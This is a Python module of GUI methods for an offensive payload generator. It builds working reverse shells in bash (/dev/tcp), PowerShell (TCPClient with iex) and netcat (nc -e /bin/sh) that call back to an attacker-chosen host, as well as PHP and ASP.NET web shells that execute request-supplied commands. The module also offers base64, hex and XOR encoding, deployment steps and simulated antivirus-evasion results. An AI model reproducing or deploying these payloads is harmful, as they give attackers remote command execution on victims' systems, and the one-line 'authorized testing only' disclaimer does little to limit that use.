"""
Payload generation methods for the modern GUI
These methods will be added to the ModernCKeeperGUI class
"""

import base64
from datetime import datetime
import tkinter as tk
from tkinter import messagebox, filedialog, scrolledtext

def update_payload_options(self, event=None):
    """Update payload options based on selected type and platform"""
    payload_type = self.payload_type.get()
    platform = self.payload_platform.get()
    
    # Update default ports based on payload type
    if payload_type == "reverse_shell":
        self.payload_lport.set("4444")
    elif payload_type == "bind_shell":
        self.payload_lport.set("4444")
    elif payload_type == "meterpreter":
        self.payload_lport.set("4444")
    elif payload_type == "web_shell":
        self.payload_lport.set("80")

def generate_payload(self):
    """Generate payload based on current configuration"""
    try:
        self.payload_status.config(text="Generating payload...", 
                                 fg=self.colors['accent_yellow'])
        
        # Get configuration
        payload_type = self.payload_type.get()
        platform = self.payload_platform.get()
        lhost = self.payload_lhost.get()
        lport = self.payload_lport.get()
        encoder = self.payload_encoder.get()
        
        if not lhost or not lport:
            messagebox.showerror("Error", "Please provide LHOST and LPORT")
            return
        
        # Generate payload using engine if available
        if self.engine and hasattr(self.engine, 'modules') and 'payload_generator' in self.engine.modules:
            payload_module = self.engine.modules['payload_generator']
            result = self._generate_with_engine(payload_module, payload_type, platform, lhost, lport, encoder)
        else:
            # Generate sample payload for demo
            result = self._generate_sample_payload(payload_type, platform, lhost, lport, encoder)
        
        # Update GUI with results
        self._update_payload_display(result)
        
        self.payload_status.config(text="Payload generated successfully", 
                                 fg=self.colors['accent_green'])
        self.add_activity_log(f"Generated {payload_type} payload for {platform}")
        
    except Exception as e:
        self.payload_status.config(text=f"Generation failed: {str(e)}", 
                                 fg=self.colors['accent_red'])
        messagebox.showerror("Error", f"Failed to generate payload: {str(e)}")

def _generate_sample_payload(self, payload_type, platform, lhost, lport, encoder):
    """Generate sample payload for demonstration"""
    
    # Sample payload templates
    if payload_type == "reverse_shell":
        if platform == "linux":
            raw_payload = f'''#!/bin/bash
# Linux Reverse Shell
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'''
            
        elif platform == "windows":
            raw_payload = f'''@echo off
REM Windows Reverse Shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'''
        
        else:  # macos/android
            raw_payload = f'''#!/bin/bash
# Generic Unix Reverse Shell
nc -e /bin/sh {lhost} {lport}'''
    
    elif payload_type == "web_shell":
        if platform == "linux":
            raw_payload = '''<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
<html><body>
<form method="GET" name="shell" action="">
<input type="text" name="cmd" placeholder="Enter command">
<input type="submit" value="Execute">
</form>
</body></html>'''
        else:
            raw_payload = '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e)
{
    string cmd = Request.QueryString["cmd"];
    if(cmd != null)
    {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write(p.StandardOutput.ReadToEnd());
    }
}
</script>'''
    
    else:  # bind_shell, meterpreter, or custom
        raw_payload = f"# {payload_type.title()} payload for {platform}\\n# LHOST: {lhost}\\n# LPORT: {lport}\\n\\n# Implementation would go here..."
    
    # Apply encoding
    encoded_payload = raw_payload
    if encoder == "base64":
        encoded_payload = base64.b64encode(raw_payload.encode()).decode()
    elif encoder == "hex":
        encoded_payload = raw_payload.encode().hex()
    elif encoder == "xor":
        # Simple XOR encoding with key 0xAA
        encoded_payload = ''.join([hex(ord(c) ^ 0xAA)[2:].zfill(2) for c in raw_payload])
    
    # Generate assembly (simplified)
    assembly = f"""; {payload_type.title()} Assembly for {platform}
; Generated at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

section .text
    global _start

_start:
    ; Connect to {lhost}:{lport}
    ; Payload implementation would go here
    ; ...
    
    ; Exit
    mov eax, 1
    int 0x80"""
    
    # Generate payload info
    info = f"""Payload Information
==================

Type: {payload_type.title()}
Platform: {platform.title()}
Target: {lhost}:{lport}
Encoder: {encoder.title()}
Size: {len(raw_payload)} bytes
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Description:
This is a {payload_type} payload targeting {platform} systems.
{'The payload will connect back to the specified host and port.' if 'reverse' in payload_type else 'The payload will bind to the specified port and wait for connections.'}

Usage Instructions:
1. Set up a listener on {lhost}:{lport}
2. Deploy the payload to the target system
3. Execute the payload to establish connection

Security Note:
This payload is for authorized testing only. Use responsibly and with proper authorization.
"""
    
    return {
        'raw_payload': raw_payload,
        'encoded_payload': encoded_payload,
        'assembly': assembly,
        'info': info
    }

def _update_payload_display(self, result):
    """Update payload display with generated results"""
    # Clear previous content
    self.payload_text.delete('1.0', tk.END)
    self.encoded_text.delete('1.0', tk.END)
    self.assembly_text.delete('1.0', tk.END)
    self.info_text.delete('1.0', tk.END)
    
    # Insert new content
    self.payload_text.insert('1.0', result.get('raw_payload', ''))
    self.encoded_text.insert('1.0', result.get('encoded_payload', ''))
    self.assembly_text.insert('1.0', result.get('assembly', ''))
    self.info_text.insert('1.0', result.get('info', ''))
    
    # Store current payload for saving
    self.current_payload = result

def save_payload(self):
    """Save generated payload to file"""
    if not hasattr(self, 'current_payload'):
        messagebox.showerror("Error", "No payload to save. Generate a payload first.")
        return
    
    try:
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[
                ("Text files", "*.txt"),
                ("Shell scripts", "*.sh"),
                ("Batch files", "*.bat"),
                ("Python files", "*.py"),
                ("All files", "*.*")
            ]
        )
        
        if filename:
            content = self.current_payload.get('raw_payload', '')
            
            with open(filename, 'w') as f:
                f.write(content)
            
            messagebox.showinfo("Success", f"Payload saved to {filename}")
            self.add_activity_log(f"Saved payload to {filename}")
            
    except Exception as e:
        messagebox.showerror("Error", f"Failed to save payload: {str(e)}")

def test_payload(self):
    """Test generated payload (simulation)"""
    if not hasattr(self, 'current_payload'):
        messagebox.showerror("Error", "No payload to test. Generate a payload first.")
        return
    
    # Simulate payload testing
    result = messagebox.askyesno("Test Payload", 
                               "This will simulate testing the payload in a safe environment.\\n\\n"
                               "Do you want to continue?")
    
    if result:
        self.payload_status.config(text="Testing payload...", fg=self.colors['accent_yellow'])
        
        # Simulate test results after a delay
        self.root.after(2000, self._show_test_results)

def _show_test_results(self):
    """Show simulated test results"""
    test_results = """Payload Test Results
===================

✓ Syntax Check: PASSED
✓ Size Validation: PASSED (324 bytes)
✓ Bad Character Check: PASSED
✓ Encoding Verification: PASSED
⚠ AV Evasion: PARTIAL (3/5 engines bypassed)
✓ Network Connectivity: SIMULATED OK

Recommendations:
- Consider additional obfuscation for better AV evasion
- Test in controlled environment before deployment
- Verify target platform compatibility

Test completed successfully."""
    
    # Show results in a new window
    test_window = tk.Toplevel(self.root)
    test_window.title("Payload Test Results")
    test_window.geometry("500x400")
    test_window.configure(bg=self.colors['bg_secondary'])
    
    text_widget = scrolledtext.ScrolledText(test_window,
                                           font=('Consolas', 10),
                                           bg=self.colors['bg_secondary'],
                                           fg=self.colors['text_primary'],
                                           wrap=tk.WORD)
    text_widget.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
    text_widget.insert('1.0', test_results)
    text_widget.config(state=tk.DISABLED)
    
    self.payload_status.config(text="Payload tested successfully", 
                             fg=self.colors['accent_green'])
    self.add_activity_log("Payload test completed")
